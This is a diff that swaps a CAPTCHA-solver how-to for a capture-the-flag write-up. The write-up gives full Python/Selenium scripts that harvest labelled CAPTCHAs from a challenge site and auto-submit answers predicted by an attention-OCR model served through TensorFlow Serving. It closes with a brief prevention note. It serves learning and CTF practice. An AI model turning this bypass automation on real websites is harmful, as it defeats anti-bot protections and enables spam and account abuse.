@@ -1,167 +1,184 @@
-# How to create a text-based CAPTCHA solving engine
- 
-This is a how-to guide for creating a CAPTCHA solving AI model that can be used to solve text-based CAPTCHAs as discussed in the following [blog](https://labs.mwrinfosecurity.com/blog/captcha22/). Two helper scripts are provided that can aid in the CAPTCHA-labeling process.
+# First thoughts:
+On opening the website there is the option to open the captcha site. There I have 30 seconds to input a captcha. If the captcha is right and the time hasn't run out, you get redirectd to the next captcha site where you have to input 3 more.
+If the captcha gets input wrong or the time ran out I got redirected to a fail site where the correct captcha was printed out.
 
-## Dependencies
+# The Exploit:
+I knew that there where 4 stages of captchas I had to solve so I thought about automating it. My Idea was to use some kind of atrifical neural network to recognize the characters and input them to the site. To train such a network I needed a lot of trainig data. So data which has the captcha and the solutiun.
+Luckily I could just download the captcha from the site and get the captchas label from the fail site. So I wrote a liitle python script which would dump me 10000 captchas save them in a file and note the filename together with the captcha label in a seperate file.
+```python
+import base64
+from selenium import webdriver
 
-The following Python packages are required to create the model:
-* Tensorflow - [High Performance Numerical Computation](https://www.tensorflow.org/)
-* AOCR - [Attention Optimal Character Recognition model](https://github.com/emedvedev/attention-ocr)
-* CV2 - [OpenCv](https://opencv.org/) for reading and viewing images (Optional for helper scripts)
-* Glob - For file management (Optional for helper scripts)
+driver = webdriver.Chrome()
 
-Each of these packages can be installed using:
+labels = open("labels.txt", "w")
 
+
+def get_images(url):
+    
+    driver.get(url)
+
+    img = driver.find_element_by_tag_name('img')
+    img_data = img.get_attribute("src")[22:].encode()
+
+    buttons = driver.find_elements_by_tag_name('button')
+    
+    for btn in buttons:
+        if btn.get_attribute("type") == "submit" and btn.text=="Next":
+            btn.click()
+
+            captchaLabel = driver.find_element_by_tag_name('b')
+
+            filename = captchaLabel.text
+            with open("captchas/" + filename + ".png", 'wb') as out_file:
+                out_file.write(base64.decodebytes(img_data))
+
+            labels.write(filename + '.png ' + filename + '\n')
+            break    
+
+if __name__ == '__main__':
+    for i in range(0,10000):
+        print("Done " + str(i))
+
+        get_images('http://hax1.allesctf.net:9200/captcha/0')
+
+    labels.close()
+    driver.close()
 ```
-pip install <package_name>
+After I extracted some data I took 10% of the downloaded files and put them in a diffrent file as test data. The rest is training data.
+Then I used a tensorflow model from github called [attention ocr](https://github.com/emedvedev/attention-ocr). This model first runs a convolutional neural network on the imgae which splits the image into the characters. Then it uses a long short term momery network to predict the characters. (Note to intstall the attention ocr library you need python2 because the tensorflow 1.14 version is required)
+Now I could use the model to create a trainig and testing datasets with the `aocr dataset <captcha-annotations> training.tfrecords` command. With the command `aocr train --max-prediction 16 --max-width 300 training.tfrecords` I could train the network. The 2 parameters `max-prediction` trains the model to have a maximum of 16 characters and the max-width parameter is used to tell the model the maximum width of the provided captchas. (I later found out that 300 was a bit to short but nevertheless it worked for me xD )
+I let the model train for a night after that I tested the training data with the command `aocr test --max-prediction 16 --max-width 300 testing.tfrecords` and got a result of almost 100% accuracy for all the testing data. I also had the option to visualize how the model looks at the captcha ![predictionGIF][image.gif].
+now that the model was trained I could export it with the `aocr export --max-prediction 16 --max-width 300` command and then start a docker container
 ```
-
-For the final step, AOCR Model Deployment, [Tensorflow Serving](https://github.com/tensorflow/serving) is also required. The simplest installation is via APT. The steps can be found [here](https://github.com/tensorflow/serving/blob/master/tensorflow_serving/g3doc/setup.md).
-
-## CAPTCHA Solving Process
-
-The CAPTCHA solving process consists of six steps:
-
-1. CAPTCHA Retrieval
-2. CAPTCHA Labeling
-3. AOCR Dataset Generation
-4. AOCR Model Training
-5. AOCR Model Validation
-6. AOCR Model Deployment
-
-
-### 1. CAPTCHA retrieval
-
-In order to train the AOCR model, examples of the CAPTCHA are required. Ideally, an initial testing dataset should consist of 500 CAPTCHAs where 450 will be used for training and 50 for validation. If the initial results indicate that the process is successful, these values can be increased to further improve the accuracy of the model.
-
-The location of the CAPTCHA implementation will determine the retrieval process. Ideally, you want to look for the request used to retrieve the CAPTCHA. Once you have this link, you should be able to perform an iterative `wget` request to retrieve and save the required number of CAPTCHAs. The naming convention for these downloads does not really matter since the CAPTCHAs will be renamed after labeling.
-
-### 2. CAPTCHA Labeling
-
-The CAPTCHA labeling process requires the most effort and time. A helper script, `captcha_labeling_script.py`, is provided to assist with this process.
-
-The script can be used by executing:
-
+sudo docker run -p 8501:8501 \                                                                                                                                               
+  --mount type=bind,source=<directory>/exported-model/,target=/models/captcha \
+  -e MODEL_NAME=captcha -t tensorflow/serving
 ```
-python catcha_labeling_script.py <directory with CAPTCHAs> <directory to store labeled CAPTCHAs>
-```
-
-The script will show the CAPTCHAs one by one requesting input from the user for the label of the CAPTCHA. The user can press `-` to end the current label or `` ` `` to end the labeling session. For each entered label, the CAPTCHA will be saved with the label as the name and the unlabeled CAPTCHA image will be removed.
-
-### 3. AOCR Dataset Generation
-
-Training and validation datasets have to be created for the AOCR model. The `label_generating_script.py` helper script can be used to generate the dataset if the `captcha_labeling_script.py` was used to label the CAPTCHA.
-
-The script can be used by executing:
-
-```
-python label_generating_script.py <directory where CAPTCHAs are stored> <directory to store label file>
-```
-
-The output from the script would be a label file, `label.txt`, with the names and answers for each of the CAPTCHAs. The contents of this file should be split into two, namely `train_labels.txt` and `test_labels.txt`. It is recommended that roughly 10% of all data is used for testing. If 500 CAPTCHAs were labeled, copy 450 of the lines of `label.txt` to `train_labels.txt` and the remaining 50 lines to `test_labels.txt`.
-
-These files will have to be converted into the `tfrecords` format for the AOCR model. Copy the two files into the directory where the CAPTCHAs are stored and from the directory execute the following:
-
-```
-aocr dataset train_labels.txt training.tfrecords
-aocr dataset test_labels.txt testing.tfrecords
-```
-
-### 4. AOCR Model Training
-
-The AOCR model will have to be trained. This can be done by executing the following:
-
-```
-aocr train training.tfrecords
-```
-
-Remember to include and set the `--max-width` and `--max-height` values depending on the size of the CAPTCHA used.
-
-The `loss` and `perplexity` values should be reviewed during training. Ideally the `perplexity` will fall to 1.00 and the `loss` should drop below 0.002. The model will auto-save every 100 steps. Once sufficient `loss` and `perplexity` values have been reached, the training can be stopped by simply pressing `Ctrl^C`. Training can also be continued later by just running the same command. It is recommended that for every 500 steps, training is stopped, and a validation round is performed. 
-
-### 5 AOCR Model Validation
-
-Validation of the AOCR model is required to determine if the model has successfully learnt the features and text of the CAPTCHA. Validation can be done by executing the following:
-
-```
-aocr test testing.tfrecords
-```
-
-The same values of `--max-width` and `--max-height` used for training should be provided for the validation step. The validation step will provide four readings per CAPTCHA namely:
-
-1. `Accuracy` - The accuracy of the entire image prediction. 100% indicates that all character were successfully predicted.
-2. `Probability` - The certainty of the model that the provided prediction is correct. This can be used to filter predictions of a trained model to improve submission accuracy. 
-3. `Loss` - A higher loss indicates a bigger discrepancy between the learnt model and the validation data.
-4. `Perplexity` - A higher perplexity indicates that the validation data is "new" to the model and it hasn't learnt or seen anything like it before.
-
-The results can then be reviewed. The 100% accuracy hits are the CAPTCHAs that the model was able to correctly predict. A high number of these indicates positive results for completely solving the CAPTCHA. More data can be used to further increase the accuracy of the model.
-
-The model will indicate the actual and predicted answer for CAPTCHAs were the entire CAPTCHA could not be predicted. A review of these results will indicate what characters the model is currently confusing. The most common are `l` and `i` as well as `n` and `m`. If there are any incorrect predictions that do not make logical sense, such as `C` being predicted as `X`, review the labeled data as it could be that some of the labels are incorrect.
-
-If almost no testing samples are solved 100%, it could indicate that the noise in the CAPTCHA is too high and hence a pre-processing step is required. This will depend on the specific CAPTCHA. Additionally, more training samples, or even more training steps, can also improve the accuracy.
-
-### 6 AOCR Model Deployment
-
-If a sufficiently accurate model could be trained, the model should be deployed to a Tensorflow server for use. The model will have to be extracted first and can be done by executing:
-
-```
-aocr export exported-model
-```
-
-Copy the contents of the `exported-model` folder into a sub-folder named `1`. The exported model can now be deployed using a Tensorflow model server.
-
-To create the server, execute the following command:
-
-```
-tensorflow_model_server --port=9000 --rest_api_port=9001 --model_name=<yourmodelname> --model_base_path=<full path to exported model directory>
-```
-
-To make use of this model, a curl request with a base64 encoded CAPTCHA can be used. Such as the following example:
-
+Now I could send a message with curl to receive a prediction:
 ```
 curl -X POST \
-  http://localhost:9001/v1/models/yourmodelname:predict \
+  http://localhost:8501/v1/models/captcha:predict \
   -H 'cache-control: no-cache' \
   -H 'content-type: application/json' \
   -d '{
   "signature_name": "serving_default",
   "inputs": {
-     	"input": { "b64": "/9j/4AAQ==" }
+     	"input": { "b64": "<your image encoded as base64>" }
   }
 }'
 ```
 
-The server would then respond with the CAPTCHA answer as well as prediction certainty. To increase submission accuracy, the prediction certainty can be used as filter value to discard any CAPTCHAs with a prediction below a chosen certainty.
+The last step was to use python with selenium to read the captchas and input the right captchas.
+```python
+import base64
+from selenium import webdriver
+import requests
+import os
+import json
+import time
 
 
+driver = webdriver.Chrome()
+
+headers = {
+    'cache-control': 'no-cache',
+    'content-type': 'application/json',
+}
+
+def solve_captcha(img_data):    
+    data = '{\n  "signature_name": "serving_default",\n  "inputs": {\n     \t"input": { "b64": "' + img_data.decode("utf-8")  + '" }\n  }\n}'
+
+    response = requests.post('http://localhost:8501/v1/models/captcha:predict', headers=headers, data=data).text
+
+    y = json.loads(response)
+    out = y["outputs"]
+    print("Prob: " + str(out["probability"]) + " Guess: " + str(out["output"]))
+
+    return out["output"]
+
+def solve_0():
+    time.sleep(0.5)
+    img = driver.find_element_by_tag_name('img')
+    img_data = img.get_attribute("src")[22:].encode()
+    
+    inp = driver.find_element_by_tag_name('input')
+    inp.send_keys(solve_captcha(img_data))
+
+    buttons = driver.find_elements_by_tag_name('button')
+    
+    for btn in buttons:
+        if btn.get_attribute("type") == "submit" and btn.text=="Next":
+            btn.click()
+
+            break
+    
+def solve_1():
+    time.sleep(0.5)
+    imgs = driver.find_elements_by_tag_name('img')
+    inps = driver.find_elements_by_tag_name('input')
+
+    for i in range(0,3):
+        img_data = imgs[i].get_attribute("src")[22:].encode()
+        inps[i].send_keys(solve_captcha(img_data))
+
+    buttons = driver.find_elements_by_tag_name('button')
+    
+    for btn in buttons:
+        if btn.get_attribute("type") == "submit" and btn.text=="Next":
+            btn.click()
+
+            break
+
+def solve_2():
+    time.sleep(0.5)
+    imgs = driver.find_elements_by_tag_name('img')
+    inps = driver.find_elements_by_tag_name('input')
 
 
+    for i in range(0,10):
+        img_data = imgs[i].get_attribute("src")[22:].encode()
+    
+        inps[i].send_keys(solve_captcha(img_data))
+
+    buttons = driver.find_elements_by_tag_name('button')
+    
+    for btn in buttons:
+        if btn.get_attribute("type") == "submit" and btn.text=="Next":
+            btn.click()
+
+            break
+
+def solve_3():
+    time.sleep(0.2)
+    imgs = driver.find_elements_by_tag_name('img')
+    inps = driver.find_elements_by_tag_name('input')
 
 
+    for i in range(0,100):
+        img_data = imgs[i].get_attribute("src")[22:].encode()
+    
+        inps[i].send_keys(solve_captcha(img_data))
 
+    buttons = driver.find_elements_by_tag_name('button')
+    
+    for btn in buttons:
+        if btn.get_attribute("type") == "submit" and btn.text=="Next":
+            btn.click()
 
+            break
+    
 
+if __name__ == '__main__':
+    driver.get('http://hax1.allesctf.net:9200/captcha/0')
 
+    solve_0()
+    solve_1()
+    solve_2()
+    solve_3()
 
+    #driver.close()
+```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+# Prevention:
+The problem with this site is that the captchas are very easy to crack for an atrifical neural network. Also it is much safer to use a software which is well known to work like reCAPTCHA.
